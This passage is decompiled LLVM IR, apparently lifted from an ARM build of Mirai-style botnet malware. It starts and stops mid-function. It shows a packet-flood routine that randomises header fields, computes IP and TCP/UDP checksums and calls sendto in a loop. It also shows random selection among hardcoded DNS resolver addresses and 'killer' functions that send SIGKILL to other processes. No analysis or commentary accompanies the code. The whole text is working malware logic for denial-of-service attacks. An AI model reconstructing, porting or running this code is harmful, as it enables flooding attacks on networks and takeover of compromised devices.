  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @r7, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 27
  store i32 %v1_c6d4, i32* @sb, align 4
  %v1_c6d8 = add i32 %v0_c6d4, 47
  store i32 %v1_c6d8, i32* @sl, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c6d0
  %v1_c6e8 = phi i32 [ %v1_c7a8, %dec_label_pc_c720 ], [ 0, %dec_label_pc_c6d0 ]
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v3_c494, i32* %ip.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 4
  %v5_c6e8 = add i32 %v4_c6e8, %v2_c1ec
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  store i32 %v7_c6e8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_c6f0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6f4 = add i32 %v7_c6e8, 20
  store i32 %v1_c6f4, i32* @r6, align 4
  br i1 %v3_c6f0, label %dec_label_pc_c7cc, label %dec_label_pc_c6fc

dec_label_pc_c6fc:                                ; preds = %dec_label_pc_c6dc
  store i32 %v3_c49c, i32* @lr, align 4
  store i1 %v3_c700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c700, label %dec_label_pc_c7e0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge, %dec_label_pc_c6fc
  %v1_c70c = phi i32 [ %v1_c70c.pre, %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge ], [ 65535, %dec_label_pc_c6fc ]
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v9_c70c = icmp eq i32 %v3_c4b8, %v1_c70c
  store i1 %v9_c70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c70c, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v1_c718 = phi i32 [ %v1_c7ec, %dec_label_pc_c7e0 ], [ %v1_c70c, %dec_label_pc_c708 ]
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v9_c718 = icmp eq i32 %v3_c4c0, %v1_c718
  store i1 %v9_c718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c718, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714, %dec_label_pc_c808
  %v0_c720 = load i32, i32* @r4, align 4
  %v1_c720 = add i32 %v0_c720, 41
  store i32 %v1_c720, i32* %r0.global-to-local, align 4
  store i32 %v4_c724.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c728 = call i32 @rand_alpha_str(i32 %v1_c720, i32 %v4_c724.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c730 = load i32, i32* @r4, align 4
  %v3_c730 = add i32 %v2_c730, 10
  %v4_c730 = inttoptr i32 %v3_c730 to i16*
  store i16 0, i16* %v4_c730, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* @r0, align 4
  %v2_c73c = call i32 @checksum_generic(i32 %v0_c738, i32 20)
  %v3_c73c = trunc i32 %v2_c73c to i16
  store i32 %v2_c73c, i32* %r0.global-to-local, align 4
  %v3_c740 = load i32, i32* @r4, align 4
  %v4_c740 = add i32 %v3_c740, 10
  %v5_c740 = inttoptr i32 %v4_c740 to i16*
  store i16 %v3_c73c, i16* %v5_c740, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c748 = load i32, i32* @r6, align 4
  %v3_c748 = add i32 %v2_c748, 6
  %v4_c748 = inttoptr i32 %v3_c748 to i16*
  store i16 0, i16* %v4_c748, align 2
  %v0_c74c = load i32, i32* @r6, align 4
  store i32 %v0_c74c, i32* @r1, align 4
  %v1_c750 = add i32 %v0_c74c, 4
  %v2_c750 = inttoptr i32 %v1_c750 to i16*
  %v3_c750 = load i16, i16* %v2_c750, align 2
  %v4_c750 = zext i16 %v3_c750 to i32
  store i32 %v4_c750, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @sb, align 4
  store i32 %v0_c754, i32* %r3.global-to-local, align 4
  %v0_c758 = load i32, i32* @r4, align 4
  store i32 %v0_c758, i32* %r0.global-to-local, align 4
  %v4_c75c = call i32 @checksum_tcpudp(i32 %v0_c758, i32 %v0_c74c, i32 %v4_c750, i32 %v0_c754)
  %v5_c75c = trunc i32 %v4_c75c to i16
  store i32 %v4_c75c, i32* %r0.global-to-local, align 4
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c768 = mul i32 %v3_c760, 32
  store i32 %v3_c768, i32* %ip.global-to-local, align 4
  %v3_c76c = load i32, i32* @r6, align 4
  %v4_c76c = add i32 %v3_c76c, 6
  %v5_c76c = inttoptr i32 %v4_c76c to i16*
  store i16 %v5_c75c, i16* %v5_c76c, align 2
  %v0_c770 = load i32, i32* %ip.global-to-local, align 4
  %v1_c770 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_c770, -8
  %v5_c770 = add i32 %v0_c770, %tmp133
  store i32 %v5_c770, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @r6, align 4
  %v1_c774 = add i32 %v0_c774, 2
  %v2_c774 = inttoptr i32 %v1_c774 to i16*
  %v3_c774 = load i16, i16* %v2_c774, align 2
  %v4_c774 = zext i16 %v3_c774 to i32
  store i32 %v4_c774, i32* @r6, align 4
  %v1_c778 = load i32, i32* @lr, align 4
  %v2_c778 = add i32 %v1_c778, %v5_c770
  store i32 %v2_c778, i32* %ip.global-to-local, align 4
  %v3_c77c = add i32 %v2_c778, 2
  %v4_c77c = inttoptr i32 %v3_c77c to i16*
  store i16 %v3_c774, i16* %v4_c77c, align 2
  %v0_c780 = load i32, i32* @fp, align 4
  %v1_c780 = load i32, i32* %ip.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, 4
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v0_c790 = load i32, i32* @sl, align 4
  store i32 %v0_c790, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c798 = load i32, i32* %ip.global-to-local, align 4
  %v6_c7a0 = call i32 @__libc_sendto(i32 %v3_c438, i32 %v0_c784, i32 %v0_c790, i32 16384, i32 %v0_c798, i32 16)
  %v3_c7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a4, i32* %r3.global-to-local, align 4
  %v1_c7a8 = add i32 %v3_c7a4, 1
  store i32 %v1_c7a8, i32* %r0.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r8, align 4
  %v9_c7ac = icmp eq i32 %v0_c7ac, %v1_c7a8
  store i1 %v9_c7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7a8, i32* %stack_var_-44, align 4
  %v8_c7b4 = icmp sgt i32 %v0_c7ac, %v1_c7a8
  br i1 %v8_c7b4, label %dec_label_pc_c6dc, label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c720
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7bc = icmp eq i32 %v0_c7ac, 0
  store i1 %v2_c7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7bc, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c6dc
  %v0_c7cc = call i32 @rand_next()
  %v1_c7cc = trunc i32 %v0_c7cc to i16
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  store i32 %v3_c49c, i32* @lr, align 4
  %v1_c7d4 = load i32, i32* @r5, align 4
  %v9_c7d4 = icmp eq i32 %v3_c49c, %v1_c7d4
  store i1 %v9_c7d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d8 = load i32, i32* @r4, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 4
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i16*
  store i16 %v1_c7cc, i16* %v5_c7d8, align 2
  br i1 %v9_c7d4, label %dec_label_pc_c7e0, label %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge

dec_label_pc_c7cc.dec_label_pc_c708_crit_edge:    ; preds = %dec_label_pc_c7cc
  %v1_c70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c708

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c6fc
  %v0_c7e0 = call i32 @rand_next()
  %v1_c7e0 = trunc i32 %v0_c7e0 to i16
  %v3_c7e4 = load i32, i32* @r4, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7e0, i16* %v5_c7e4, align 2
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v1_c7ec = load i32, i32* @r5, align 4
  %v9_c7ec = icmp eq i32 %v3_c4b8, %v1_c7ec
  store i1 %v9_c7ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v0_c7f4 = call i32 @rand_next()
  %v1_c7f4 = trunc i32 %v0_c7f4 to i16
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v1_c7fc = load i32, i32* @r5, align 4
  %v9_c7fc = icmp eq i32 %v3_c4c0, %v1_c7fc
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c800 = load i32, i32* @r6, align 4
  %v4_c800 = add i32 %v3_c800, 2
  %v5_c800 = inttoptr i32 %v4_c800 to i16*
  store i16 %v1_c7f4, i16* %v5_c800, align 2
  br i1 %v9_c7fc, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714
  %v0_c808 = call i32 @rand_next()
  %v1_c808 = trunc i32 %v0_c808 to i16
  store i32 %v0_c808, i32* %r0.global-to-local, align 4
  %v3_c80c = load i32, i32* @r4, align 4
  %v4_c80c = add i32 %v3_c80c, 28
  %v5_c80c = inttoptr i32 %v4_c80c to i16*
  store i16 %v1_c808, i16* %v5_c80c, align 2
  br label %dec_label_pc_c720

dec_label_pc_c814:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c37c, %dec_label_pc_c320, %entry
  %v0_c814 = call i32 @rand_next()
  %v1_c818 = urem i32 %v0_c814, 4
  store i32 %v1_c818, i32* %r0.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c818, 3
  store i1 %v2_c81c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c814 to i2
  switch i2 %trunc, label %dec_label_pc_c4189 [
    i2 0, label %dec_label_pc_c874
    i2 1, label %dec_label_pc_c86c
    i2 -2, label %dec_label_pc_c860
    i2 -1, label %dec_label_pc_c850
  ]

dec_label_pc_c838:                                ; preds = %dec_label_pc_c448
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v1_c83c = call i32 @__GI___libc_close(i32 %v3_c438)
  store i32 %v1_c83c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c840

dec_label_pc_c840:                                ; preds = %dec_label_pc_c420, %dec_label_pc_c418, %dec_label_pc_c838
  %v1_c84c = phi i32 [ %v3_c438, %dec_label_pc_c420 ], [ %v1_c84c50, %dec_label_pc_c418 ], [ %v1_c83c, %dec_label_pc_c838 ]
  store i32 %v18_c1cc, i32* %sb.global-to-local, align 4
  store i32 %v27_c1cc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c84c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c814
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c860:                                ; preds = %dec_label_pc_c814
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c814
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c874:                                ; preds = %dec_label_pc_c814
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c418

; uselistorder directives
  uselistorder i32 %v1_c818, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c814, { 1, 0 }
  uselistorder i32 %v0_c808, { 1, 0 }
  uselistorder i32 %v0_c7f4, { 1, 0 }
  uselistorder i32 %v1_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7cc, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c770, { 1, 0 }
  uselistorder i32 %v4_c75c, { 1, 0 }
  uselistorder i32 %v2_c73c, { 1, 0 }
  uselistorder i1 %v3_c700, { 1, 0 }
  uselistorder i1 %v3_c6f0, { 1, 0 }
  uselistorder i32 %v4_c724.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c698, { 1, 0, 2 }
  uselistorder i32 %v0_c688, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c674, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c670, { 1, 0, 2 }
  uselistorder i32 %v0_c5e0, { 1, 0 }
  uselistorder i32 %v4_c5dc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_c528, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v3_c4a4, { 1, 0 }
  uselistorder i32 %v3_c49c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_c494, { 0, 2, 1 }
  uselistorder i8 %v5_c48c, { 1, 0, 2 }
  uselistorder i32 %v1_c478, { 1, 0 }
  uselistorder i32 %v0_c478, { 1, 0 }
  uselistorder i1 %v7_c468, { 1, 0 }
  uselistorder i1 %v7_c43c, { 1, 0 }
  uselistorder i32 %v3_c438, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c418, { 1, 0, 2 }
  uselistorder i32 %v2_c3e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3e4, { 1, 0, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i32 %v1_c3cc, { 1, 0, 2 }
  uselistorder i1 %v8_c3c4, { 1, 0 }
  uselistorder i1 %v7_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i8 %v2_c3a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c3ac, { 1, 0 }
  uselistorder i32 %v0_c3cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c39c, { 0, 2, 1 }
  uselistorder i32 %v1_c3b0, { 0, 2, 1 }
  uselistorder i32 %v2_c384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c374, { 1, 0 }
  uselistorder i32 %v0_c374, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_c318, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c2b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c29c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c284, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c26c, { 1, 2, 0 }
  uselistorder i32 %v5_c260, { 0, 2, 1 }
  uselistorder i32 %v7_c228, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c228, { 0, 2, 1 }
  uselistorder i32 %v2_c1ec, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 34, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 36, 35, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 43, 42, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 102, 103, 104, 105, 106, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 98, 99, 100, 101, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c840, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c720, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c6c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c690, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c394, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8b0, label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %entry
  %v0_c8a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c89c, %dec_label_pc_c898
  %v0_c8a8 = phi i32 [ %v2_c8a8, %dec_label_pc_c89c ], [ 0, %dec_label_pc_c898 ]
  %v0_c8a0 = phi i32 [ %v5_c8a0, %dec_label_pc_c89c ], [ %v0_c8a0.pre, %dec_label_pc_c898 ]
  %v0_c89c = phi i32 [ %v1_c89c, %dec_label_pc_c89c ], [ %arg1, %dec_label_pc_c898 ]
  %v1_c89c = add i32 %v0_c89c, -2
  %v1_c8a0 = inttoptr i32 %v0_c8a0 to i16*
  %v2_c8a0 = load i16, i16* %v1_c8a0, align 2
  %v3_c8a0 = zext i16 %v2_c8a0 to i32
  %v5_c8a0 = add i32 %v0_c8a0, -2
  store i32 %v5_c8a0, i32* @r0, align 4
  %v2_c8a8 = add i32 %v3_c8a0, %v0_c8a8
  %v1_c89c.cmp = icmp ugt i32 %v1_c89c, 1
  br i1 %v1_c89c.cmp, label %dec_label_pc_c89c, label %dec_label_pc_c8b0.loopexit

dec_label_pc_c8b0.loopexit:                       ; preds = %dec_label_pc_c89c
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %entry, %dec_label_pc_c8b0.loopexit
  %v1_c8b8 = phi i32 [ %v2_c8a8, %dec_label_pc_c8b0.loopexit ], [ 0, %entry ]
  %v0_c8b0 = phi i32 [ %v1_c89c, %dec_label_pc_c8b0.loopexit ], [ %arg1, %entry ]
  %v7_c8b0 = icmp eq i32 %v0_c8b0, 1
  br i1 %v7_c8b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8b0
  %v1_c8b4 = load i32, i32* @r0, align 4
  %v2_c8b4 = inttoptr i32 %v1_c8b4 to i8*
  %v3_c8b4 = load i8, i8* %v2_c8b4, align 1
  %v4_c8b4 = zext i8 %v3_c8b4 to i32
  %v3_c8b8 = add i32 %v1_c8b8, %v4_c8b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8b0, %bb
  %v0_c8bc = phi i32 [ %v1_c8b8, %dec_label_pc_c8b0 ], [ %v3_c8b8, %bb ]
  %v3_c8c0 = urem i32 %v0_c8bc, 65536
  %v4_c8c4 = udiv i32 %v0_c8bc, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v3_c8c0
  %v4_c8c8 = udiv i32 %v5_c8c4, 65536
  %v5_c8c8 = add nuw nsw i32 %v4_c8c8, %v5_c8c4
  %v1_c8cc = urem i32 %v5_c8c8, 65536
  %v3_c8d4 = xor i32 %v1_c8cc, 65535
  ret i32 %v3_c8d4

; uselistorder directives
  uselistorder i32 %v5_c8c4, { 1, 0 }
  uselistorder i32 %v5_c8a0, { 1, 0 }
  uselistorder i32 %v1_c89c, { 1, 0, 2 }
  uselistorder i32 %v0_c8a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8ec = add i32 %arg1, 12
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v1_c8f0 = add i32 %arg1, 16
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  %v7_c8f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f4, label %dec_label_pc_c900.preheader, label %dec_label_pc_c914

dec_label_pc_c900.preheader:                      ; preds = %entry
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c900.preheader, %dec_label_pc_c900
  %v0_c90c = phi i32 [ 0, %dec_label_pc_c900.preheader ], [ %v2_c90c, %dec_label_pc_c900 ]
  %v0_c904 = phi i32 [ %v0_c904.pre, %dec_label_pc_c900.preheader ], [ %v5_c904, %dec_label_pc_c900 ]
  %v0_c900 = phi i32 [ %arg3, %dec_label_pc_c900.preheader ], [ %v1_c900, %dec_label_pc_c900 ]
  %v1_c900 = add nsw i32 %v0_c900, -2
  %v1_c904 = inttoptr i32 %v0_c904 to i16*
  %v2_c904 = load i16, i16* %v1_c904, align 2
  %v3_c904 = zext i16 %v2_c904 to i32
  %v5_c904 = add i32 %v0_c904, -2
  store i32 %v5_c904, i32* @r1, align 4
  %v2_c90c = add i32 %v3_c904, %v0_c90c
  %v8_c910 = icmp sgt i32 %v1_c900, 1
  br i1 %v8_c910, label %dec_label_pc_c900, label %dec_label_pc_c914.loopexit

dec_label_pc_c914.loopexit:                       ; preds = %dec_label_pc_c900
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c914.loopexit, %entry
  %v1_c920 = phi i32 [ %v2_c90c, %dec_label_pc_c914.loopexit ], [ 0, %entry ]
  %v0_c914 = phi i32 [ %v1_c900, %dec_label_pc_c914.loopexit ], [ %arg3, %entry ]
  %v7_c914 = icmp eq i32 %v0_c914, 1
  br i1 %v7_c914, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c914
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c914
  %v1_c918 = load i32, i32* @r1, align 4
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  %v3_c920 = add i32 %v4_c918, %v1_c920
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c948 = phi i32 [ %v1_c920, %.thread ], [ %v3_c920, %bb ]
  %v0_c928 = mul i32 %v3_c8ec, 65536
  %v3_c928 = udiv i32 %v0_c928, 65536
  %v3_c92c = urem i32 %v3_c8f0, 65536
  %v4_c934 = udiv i32 %v3_c8ec, 65536
  %v2_c930 = add nuw nsw i32 %v3_c92c, %v4_c934
  %v5_c934 = add nuw nsw i32 %v2_c930, %v3_c928
  %v1_c938 = add i32 %arg1, 9
  %v2_c938 = inttoptr i32 %v1_c938 to i8*
  %v3_c938 = load i8, i8* %v2_c938, align 1
  %v4_c938 = zext i8 %v3_c938 to i32
  %v4_c93c = udiv i32 %v3_c8f0, 65536
  %v3_c944 = mul nuw nsw i32 %v4_c938, 256
  %v5_c93c = add i32 %v4_c93c, %arg2
  %v2_c940 = add i32 %v5_c93c, %v1_c948
  %v2_c948 = add i32 %v2_c940, %v5_c934
  %v2_c94c = add i32 %v2_c948, %v3_c944
  %tmp = icmp ult i32 %v2_c94c, 65536
  br i1 %tmp, label %dec_label_pc_c96c, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb19, %dec_label_pc_c958
  %v2_c9605 = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646.in = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646 = udiv i32 %v3_c9646.in, 65536
  %v3_c95c = urem i32 %v2_c9605, 65536
  %v2_c960 = add nuw nsw i32 %v3_c95c, %v3_c9646
  %tmp20 = icmp ult i32 %v2_c960, 65536
  br i1 %tmp20, label %dec_label_pc_c96c.loopexit, label %dec_label_pc_c958

dec_label_pc_c96c.loopexit:                       ; preds = %dec_label_pc_c958
  br label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c96c.loopexit, %bb19
  %v0_c96c = phi i32 [ %v2_c960, %dec_label_pc_c96c.loopexit ], [ %v2_c94c, %bb19 ]
  %v1_c96c = urem i32 %v0_c96c, 65536
  %v3_c974 = xor i32 %v1_c96c, 65535
  ret i32 %v3_c974

; uselistorder directives
  uselistorder i32 %v2_c960, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c94c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c920, { 1, 0 }
  uselistorder i32 %v5_c904, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder i32 %v3_c8ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c900, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c98c = load i32, i32* @global_var_24734.70, align 4
  %v2_c994 = call i32 @kill(i32 %v2_c98c, i32 9)
  ret i32 %v2_c994
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c9a8 = load i32, i32* @r4, align 4
  %v6_c9a8 = load i32, i32* @r5, align 4
  %v9_c9a8 = load i32, i32* @r6, align 4
  %v12_c9a8 = load i32, i32* @r7, align 4
  %v15_c9a8 = load i32, i32* @r8, align 4
  %v18_c9a8 = load i32, i32* @sb, align 4
  %v21_c9a8 = load i32, i32* @sl, align 4
  %v24_c9a8 = load i32, i32* @fp, align 4
